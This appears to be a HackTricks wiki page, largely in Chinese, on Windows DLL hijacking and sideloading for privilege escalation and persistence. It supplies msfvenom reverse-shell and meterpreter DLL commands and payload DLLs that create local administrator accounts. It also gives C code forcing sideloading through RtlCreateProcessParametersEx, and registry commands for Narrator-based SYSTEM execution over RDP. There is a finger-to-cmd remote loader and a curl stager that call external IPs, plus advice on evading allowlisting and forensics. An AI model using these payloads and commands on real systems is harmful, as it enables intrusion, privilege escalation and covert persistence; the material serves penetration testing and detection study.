# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 涉及操纵受信任的应用去加载一个恶意的 DLL。该术语包含多种策略，例如 **DLL Spoofing, Injection, and Side-Loading**。它主要用于代码执行、实现持久化，较少用于 privilege escalation。尽管这里侧重于 escalation，但劫持的方法在不同目标间是一致的。

### 常见技术

有几种方法用于 DLL hijacking，每种方法的有效性取决于应用的 DLL 加载策略：

1. **DLL Replacement**：用恶意 DLL 替换真实 DLL，可选择使用 DLL Proxying 来保留原始 DLL 的功能。
2. **DLL Search Order Hijacking**：将恶意 DLL 放在合法 DLL 之前的搜索路径中，利用应用的搜索顺序。
3. **Phantom DLL Hijacking**：为应用创建一个恶意 DLL，让应用以为这是一个不存在但被需要的 DLL。
4. **DLL Redirection**：修改搜索参数，例如 %PATH% 或 .exe.manifest / .exe.local 文件，来指向恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中用恶意副本替换合法 DLL，这种方法常见于 DLL side-loading。
6. **Relative Path DLL Hijacking**：将恶意 DLL 放在与复制的应用一起存放的、由用户控制的目录中，类似于 Binary Proxy Execution 技术。

> [!TIP]
> For a step-by-step chain that layers HTML staging, AES-CTR configs, and .NET implants on top of DLL sideloading, review the workflow below.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 查找缺失的 DLL

查找系统中缺失 DLL 最常见的方法是运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)（来自 sysinternals），并**设置以下 2 个过滤器**：

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

然后仅显示 **File System Activity**：

![](<../../../images/image (153).png>)

如果你是要查找**一般的缺失 dlls**，请让它运行几**秒钟**。\
如果你是在查找**特定可执行文件**内部的缺失 dll，应再设置一个过滤器，比如 "Process Name" "contains" `<exec name>`，执行它，然后停止捕获事件。

## 利用缺失的 DLL

为了进行 privilege escalation，我们最好的机会是能够**写入一个特权进程会尝试加载的 dll**到某些**将被搜索到的位置**。因此，我们可以在一个比原始 dll 所在文件夹**先被搜索到**的文件夹中写入 dll（奇怪的情况），或者我们可以写到某个会被搜索但原始 dll 在任何文件夹中都不存在的文件夹。

### Dll 搜索顺序

在 [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) 中可以找到 DLL 是如何被具体加载的。

Windows 应用按一组**预定义的搜索路径**查找 DLL，遵循特定顺序。当恶意 DLL 被有策略地放置在这些目录之一并在真实 DLL 之前被加载时，就会发生 DLL hijacking。防止这种情况的一种方法是确保应用在引用所需 DLL 时使用绝对路径。

下面是 32 位系统上的 **DLL search order**：

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

以上是在启用 SafeDllSearchMode 时的**默认**搜索顺序。禁用该功能时，当前目录会提升到第二位。要禁用此功能，请创建注册表值 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** 并将其设置为 0（默认启用）。

如果以 **LOAD_WITH_ALTERED_SEARCH_PATH** 调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)，搜索将从 LoadLibraryEx 正在加载的可执行模块的目录开始。

最后注意，**一个 dll 也可能以绝对路径而不是仅名称被加载**。在那种情况下，该 dll **只会在该路径中被搜索**（如果该 dll 有任何依赖项，它们将按按名称被搜索，就像刚被加载一样）。

还有其他修改搜索顺序的方法，但这里不再展开说明。

### 将任意文件写入链成 missing-DLL hijack

1. 使用 ProcMon 过滤器（`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`）收集进程探测但找不到的 DLL 名称。
2. 如果该二进制由 **schedule/service** 运行，将其中一个名称的 DLL 放到 **application directory**（搜索顺序条目 #1）中，在下一次执行时会被加载。在一个 .NET 扫描器的案例中，进程会在 `C:\samples\app\` 中查找 `hostfxr.dll`，然后才从 `C:\Program Files\dotnet\fxr\...` 加载真实副本。
3. 构建一个 payload DLL（例如反弹 shell），并包含任意导出：`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`。
4. 如果你的原始能力是 ZipSlip-style arbitrary write，制作一个 ZIP，其条目会逃逸解压目录，以便 DLL 落在应用文件夹中：
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. 将归档投递到被监视的收件箱/共享；当计划任务重新启动该进程时，进程会加载恶意 DLL 并以服务帐户的身份执行你的代码。

### 通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading

一种高级且可确定性地影响新创建进程的 DLL 搜索路径的方法，是在使用 ntdll 的 native APIs 创建进程时为 RTL_USER_PROCESS_PARAMETERS 设置 DllPath 字段。通过在此提供一个攻击者控制的目录，当目标进程以名称解析导入的 DLL（没有使用绝对路径且未使用安全加载标志）时，就可以强制其从该目录加载恶意 DLL。

Key idea
- 使用 RtlCreateProcessParametersEx 构建进程参数，并提供一个自定义 DllPath，指向你控制的文件夹（例如放置 dropper/unpacker 的目录）。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，加载器会在解析过程中检查所提供的 DllPath，从而即使恶意 DLL 未与目标 EXE 共置，也能实现可靠的 sideloading。

Notes/limitations
- 这只影响正在创建的子进程；与 SetDllDirectory（仅影响当前进程）不同。
- 目标必须通过名称导入或使用 LoadLibrary 加载 DLL（不能是绝对路径，且未使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法被劫持。Forwarded exports 与 SxS 可能会改变优先级。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>完整的 C 示例：通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 DLL sideloading</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

操作使用示例
- 将恶意的 xmllite.dll（导出所需函数或代理到真实的那个）放入你的 DllPath 目录中。
- 使用上述技术，启动已签名且已知按名称查找 xmllite.dll 的二进制文件。加载器通过提供的 DllPath 解析导入并 sideloads your DLL。

该技术已在实战中被观察到用于驱动多阶段 sideloading 链：初始的 launcher 丢下一个 helper DLL，然后该 DLL 再启动一个 Microsoft-signed、可被劫持的二进制，使用自定义 DllPath 强制从暂存目录加载攻击者的 DLL。

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- 当遇到与内存中已加载的某个 DLL 同名的 **DLL** 时，系统会绕过通常的搜索。相反，会先检查重定向和清单(manifest)，然后才默认使用内存中已加载的 DLL。**在这种情况下，系统不会对该 DLL 进行搜索**。
- 在 DLL 被识别为当前 Windows 版本的 **known DLL** 的情况下，系统会使用其自身的 known DLL 版本及其任何依赖 DLL，**放弃搜索过程**。注册表项 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 列出了这些 known DLL。
- 如果一个 **DLL 有依赖项**，对于这些依赖 DLL 的搜索将像它们仅通过 **模块名** 指定一样进行，无论最初的 DLL 是否通过完整路径标识。

### 提权

**要求**：

- 确认一个以 **不同权限**（横向或侧向移动）运行或将以不同权限运行的进程，且该进程**缺少某个 DLL**。
- 确保对将搜索该 **DLL** 的任意 **目录** 具有 **写访问权限**。该位置可能是可执行文件所在目录，或系统路径中的某个目录。

是的，要找到这些先决条件比较困难，**因为默认情况下很少会发现一个有特权的可执行文件缺少 DLL**，并且在系统路径文件夹上拥有写权限更加**不寻常**（默认情况下你没有）。但在配置错误的环境中这是可能的。\
如果你足够幸运且满足这些要求，可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即便该项目的**主要目标是 bypass UAC**，你可能会在那里找到针对你所用 Windows 版本的 Dll hijaking 的 **PoC**（可能只需更改你有写权限的文件夹路径）。

注意，你可以通过以下方式**检查某个文件夹的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并 **检查 PATH 内所有文件夹的权限**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你也可以检查 executable 的 imports 和 dll 的 exports：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
要查看关于如何滥用 **Dll Hijacking** 在有权限写入 **System Path folder** 的情况下提升权限的完整指南，请参阅：

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自动化工具

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)会检查你是否对 system PATH 中的任何文件夹具有写入权限。\
其他用于发现此漏洞的有趣自动化工具是 **PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。

### 示例

如果你发现了可利用的场景，成功利用它的最重要事项之一是**创建一个至少导出可执行文件将从中导入的所有函数的 dll**。此外，注意 Dll Hijacking 在用于 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 或从[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) 时非常有用。你可以在这篇针对执行型 dll hijacking 的研究中找到一个 **如何创建有效 dll** 的示例： [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
此外，在**下一节**你可以找到一些**基础 dll 代码**，可用作**模板**或用于创建导出非必需函数的**dll**。

## **创建和编译 Dlls**

### **Dll Proxifying**

基本上，一个 **Dll proxy** 是一个能够在加载时**执行你的恶意代码**，同时还能通过**将所有调用转发到真实库**来**暴露**并像预期那样**工作**的 Dll。

使用工具 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 或 [**Spartacus**](https://github.com/Accenture/Spartacus)，你可以实际**指定一个可执行文件并选择要 proxify 的库**并**生成被 proxify 的 dll**，或者**指定该 Dll**并**生成被 proxify 的 dll**。

### **Meterpreter**

**获取 rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86，我没看到 x64 版本）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自己的

请注意，在某些情况下，你编译的 Dll 必须 **导出多个函数**，这些函数将被受害进程加载；如果这些函数不存在，**binary 将无法加载**它们，且**exploit 将失败**。

<details>
<summary>C DLL 模板 (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 示例：创建用户</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>带线程入口的替代 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 案例研究：Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe 在启动时仍会探测一个可预测的、与语言相关的本地化 DLL，该 DLL 可被劫持以实现任意代码执行和持久化。

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- 筛选： `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- 启动 Narrator 并观察对上述路径的加载尝试。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC 静默
- 一个简单的 hijack 会触发/高亮 UI。为了保持静默，在 attach 时枚举 Narrator 线程，打开主线程 (`OpenThread(THREAD_SUSPEND_RESUME)`) 并对其调用 `SuspendThread`；在你自己的线程中继续。完整代码见 PoC。

通过 Accessibility 配置触发与持久化
- 用户上下文 (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 配置后，启动 Narrator 会加载放置的 DLL。在安全桌面（登录屏幕）上，按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在安全桌面以 SYSTEM 身份执行。

通过 RDP 触发的 SYSTEM 执行（横向移动）
- 允许经典 RDP 安全层: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP 到主机，在登录屏幕按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在安全桌面以 SYSTEM 身份执行。
- 当 RDP 会话关闭时执行会停止——请及时注入/迁移。

Bring Your Own Accessibility (BYOA)
- 你可以克隆一个内置的 Accessibility Tool (AT) 注册表条目（例如 CursorIndicator），修改它以指向任意二进制/DLL，导入后将 `configuration` 设置为该 AT 名称。这样可以在 Accessibility 框架下代理任意执行。

注意
- 在 `%windir%\System32` 下写入以及修改 HKLM 值需要管理员权限。
- 所有载荷逻辑可以放在 `DLL_PROCESS_ATTACH` 中；不需要导出函数。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

此案例展示了 Lenovo 的 TrackPoint Quick Menu (`TPQMAssistant.exe`) 中的 **Phantom DLL Hijacking**，编号为 **CVE-2025-1729**。

### 漏洞细节

- **组件**: `TPQMAssistant.exe` 位于 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
- **计划任务**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` 在已登录用户上下文下每天 9:30 AM 运行。
- **目录权限**: 由 `CREATOR OWNER` 可写，允许本地用户放置任意文件。
- **DLL 搜索行为**: 尝试优先从其工作目录加载 `hostfxr.dll`，如果缺失会记录 "NAME NOT FOUND"，表明本地目录具有优先搜索权。

### 利用实现

攻击者可以在同一目录放置恶意的 `hostfxr.dll` 存根，利用缺失的 DLL 实现以用户上下文的代码执行：
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻击流程

1. 以 标准用户 身份 将 `hostfxr.dll` 放入 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待计划任务在当前用户上下文中于 9:30 AM 运行。
3. 如果在任务执行时有 管理员 登录，恶意 DLL 会在管理员会话中以中等完整性运行。
4. 链接标准的 UAC bypass 技术，将中等完整性提升到 SYSTEM 权限。

## 案例研究: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

威胁行为者常将基于 MSI 的 dropper 与 DLL side-loading 组合，用受信任、已签名的进程来执行载荷。

链概览
- 用户下载 MSI。GUI 安装过程中会静默运行一个 CustomAction（例如 LaunchApplication 或 VBScript action），从嵌入的资源重建后续阶段。
- dropper 将一个合法的已签名 EXE 和一个恶意 DLL 写入同一目录（示例配对：Avast 签名的 wsc_proxy.exe + 攻击者控制的 wsc.dll）。
- 当已签名的 EXE 启动时，Windows 的 DLL 搜索顺序会先从工作目录加载 wsc.dll，从而在已签名的父进程下执行攻击者代码（ATT&CK T1574.001）。

MSI 分析（要查找的内容）
- CustomAction 表：
  - 查找运行可执行文件或 VBScript 的条目。可疑模式示例：在后台执行嵌入文件的 LaunchApplication。
  - 在 Orca (Microsoft Orca.exe) 中，检查 CustomAction、InstallExecuteSequence 和 Binary 表。
- MSI CAB 中的嵌入/拆分 payload：
  - 管理员提取：msiexec /a package.msi /qb TARGETDIR=C:\out
  - 或使用 lessmsi：lessmsi x package.msi C:\out
  - 查找多个小片段，这些片段会被 VBScript CustomAction 拼接并解密。常见流程：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
使用 wsc_proxy.exe 的 实用 sideloading
- 将这两个文件放在同一文件夹中:
- wsc_proxy.exe: 合法签名的宿主 (Avast)。该进程尝试按名称从其目录加载 wsc.dll。
- wsc.dll: attacker DLL。If no specific exports are required, DllMain can suffice; otherwise, build a proxy DLL and forward required exports to the genuine library while running payload in DllMain。
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 对于导出要求，使用代理框架（例如 DLLirant/Spartacus）生成一个转发 DLL，同时执行你的 payload。

- 该技术依赖于宿主二进制的 DLL 名称解析。如果宿主使用绝对路径或安全加载标志（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），hijack 可能会失败。
- KnownDLLs、SxS 和 forwarded exports 会影响优先级，选择宿主二进制和导出集合时必须加以考虑。

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point 描述了 Ink Dragon 如何使用一个 **三文件三元组** 部署 ShadowPad，使其混入合法软件，同时将磁盘上的核心 payload 保持加密：

1. **Signed host EXE** – 滥用来自 AMD、Realtek 或 NVIDIA 的可执行文件（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻击者将可执行文件重命名以看起来像 Windows 二进制（例如 `conhost.exe`），但 Authenticode 签名仍然有效。
2. **Malicious loader DLL** – 与 EXE 放在一起并使用预期名称（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。该 DLL 通常是用 ScatterBrain 框架混淆的 MFC 二进制；其唯一职责是定位加密 blob、解密并对 ShadowPad 进行反射式映射。
3. **Encrypted payload blob** – 通常以 `<name>.tmp` 存放在相同目录中。在对解密后的 payload 进行内存映射后，loader 会删除 TMP 文件以销毁取证证据。

Tradecraft notes:

* 将签名的 EXE 重命名（同时在 PE 头中保留原始 `OriginalFileName`）可以让其伪装成 Windows 二进制但仍保留厂商签名，因此可以模仿 Ink Dragon 的做法，放置看起来像 `conhost.exe` 的二进制，实际上是 AMD/NVIDIA 的工具。
* 因为该可执行文件仍被信任，大多数 allowlisting 控制只需你的恶意 DLL 与其并置即可。把精力放在定制 loader DLL 上；签名的父程序通常可以不被修改地运行。
* ShadowPad 的解密器期望 TMP blob 与 loader 置于同一目录并可写，以便在映射后将文件清零。在 payload 加载之前保持该目录可写；一旦在内存中，TMP 文件即可安全删除以利 OPSEC。

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

攻击者将 DLL sideloading 与 LOLBAS 结合使用，因而磁盘上唯一的自定义工件是位于受信任 EXE 旁的恶意 DLL：

- **Remote command loader (Finger):** 隐藏的 PowerShell 启动 `cmd.exe /c`，从 Finger 服务器拉取命令并将其通过管道传给 `cmd`：

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` 从 TCP/79 拉取文本；`| cmd` 执行服务器响应，从而让操作者在服务器端轮换第二阶段。

- **Built-in download/extract:** 下载带有良性扩展名的归档，解包，然后在随机 `%LocalAppData%` 文件夹下放置 sideload 目标和 DLL：

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` 隐藏进度并跟随重定向；`tar -xf` 使用 Windows 内置的 tar。

- **WMI/CIM launch:** 通过 WMI 启动 EXE，使得遥测显示为 CIM 创建的进程，同时加载同目录的 DLL：

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- 适用于偏好本地 DLL 的二进制（例如 `intelbq.exe`、`nearby_share.exe`）；payload（例如 Remcos）在受信任的名称下运行。

- **Hunting:** 当 `forfiles` 同时出现 `/p`、`/m` 和 `/c` 时发出告警；在管理脚本之外很少见。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

一次最近的 Lotus Blossom 入侵滥用了一个受信任的更新链，投放了一个 NSIS 打包的 dropper，该 dropper 分阶段执行 DLL sideload 并实现完全在内存中的 payload。

Tradecraft flow
- `update.exe` (NSIS) 创建 `%AppData%\Bluetooth`，将其标记为 **HIDDEN**，放置一个重命名的 Bitdefender Submission Wizard `BluetoothService.exe`、一个恶意 `log.dll` 和一个加密 blob `BluetoothService`，然后启动该 EXE。
- 宿主 EXE 导入 `log.dll` 并调用 `LogInit`/`LogWrite`。`LogInit` 使用 mmap 加载 blob；`LogWrite` 使用自定义基于 LCG 的流解密（常数 **0x19660D** / **0x3C6EF35F**，密钥材料来自先前的哈希），将缓冲区覆盖为明文 shellcode，释放临时变量，并跳转到该代码。
- 为避免使用 IAT，loader 通过对导出名使用 **FNV-1a basis 0x811C9DC5 + prime 0x1000193** 进行哈希，随后应用类似 Murmur 的 avalanche（**0x85EBCA6B**），并与加盐的目标哈希进行比较来解析 API。

Main shellcode (Chrysalis)
- 通过对键 `gQ2JR&9;` 进行五次 add/XOR/sub 重复操作来解密一个类似 PE 的主模块，然后动态加载 `Kernel32.dll` → `GetProcAddress` 完成导入解析。
- 通过对每个字符进行位旋转/异或变换在运行时重建 DLL 名称字符串，然后加载 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32`。
- 使用第二个解析器，遍历 **PEB → InMemoryOrderModuleList**，以 4 字节块并用类似 Murmur 的混合解析每个导出表，仅在未找到哈希时才回退到 `GetProcAddress`。

Embedded configuration & C2
- 配置位于投放的 `BluetoothService` 文件内 **offset 0x30808**（大小 **0x980**），使用密钥 `qwhvb^435h&*7` 进行 RC4 解密，揭示了 C2 URL 和 User-Agent。
- Beacon 构建以点分隔的主机配置文件，前置标签 `4Q`，然后在通过 HTTPS 的 `HttpSendRequestA` 之前用密钥 `vAuig34%^325hGV` 进行 RC4 加密。响应经 RC4 解密后由标签分支派发（`4T` shell，`4V` 进程执行，`4W/4X` 文件写入，`4Y` 读取/外传，`4\\` 卸载，`4` 驱动/文件枚举 + 分块传输场景）。
- 执行模式由 CLI 参数控制：无参数 = 安装持久化（service/Run 键）指向 `-i`；`-i` 以 `-k` 重新启动自身；`-k` 跳过安装并运行 payload。

Alternate loader observed
- 同一入侵投放了 Tiny C Compiler，并在 `C:\ProgramData\USOShared\` 下以 `svchost.exe -nostdlib -run conf.c` 执行，同时旁边有 `libtcc.dll`。攻击者提供的 C 源码嵌入了 shellcode，编译后在内存中运行，无需以 PE 形式写入磁盘。可用以下方式复现：
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- 该基于 TCC 的 compile-and-run 阶段在运行时导入了 `Wininet.dll`，并从硬编码的 URL 拉取了第二阶段的 shellcode，提供了一个伪装成编译器运行的灵活 loader。

## 参考资料

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
